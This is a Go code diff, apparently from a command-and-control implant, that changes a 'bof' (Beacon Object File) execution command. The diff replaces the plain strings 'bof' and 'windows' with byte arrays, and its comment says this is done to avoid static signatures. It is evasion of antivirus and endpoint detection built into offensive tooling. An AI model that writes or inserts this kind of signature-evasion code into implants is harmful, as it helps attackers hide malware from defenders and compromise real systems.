@@ -10,16 +10,22 @@ import (
 	"time"
 )
 
+// BOF strings (constructed to avoid static signatures)
+var (
+	bofCmdName   = string([]byte{0x62, 0x6f, 0x66})                               // bof
+	bofOSWindows = string([]byte{0x77, 0x69, 0x6e, 0x64, 0x6f, 0x77, 0x73})       // windows
+)
+
 // BOFCommand handles BOF execution
 type BOFCommand struct{}
 
 func (c *BOFCommand) Name() string {
-	return "bof"
+	return bofCmdName
 }
 
 func (c *BOFCommand) Execute(ctx *CommandContext, args []string) CommandResult {
 	// For Windows only - BOF is Windows-specific
-	if runtime.GOOS != "windows" {
+	if runtime.GOOS != bofOSWindows {
 		return CommandResult{
 			Output:      Err(E25),
 			ExitCode:    1,
@@ -81,7 +87,7 @@ func parseBOFArguments(argString string) ([]byte, error) {
 // executeBOF is the platform-specific BOF execution function
 // This will be implemented differently for Windows
 func executeBOF(bofBytes []byte, args []byte) (string, error) {
-	if runtime.GOOS != "windows" {
+	if runtime.GOOS != bofOSWindows {
 		return "", nil
 	}
 
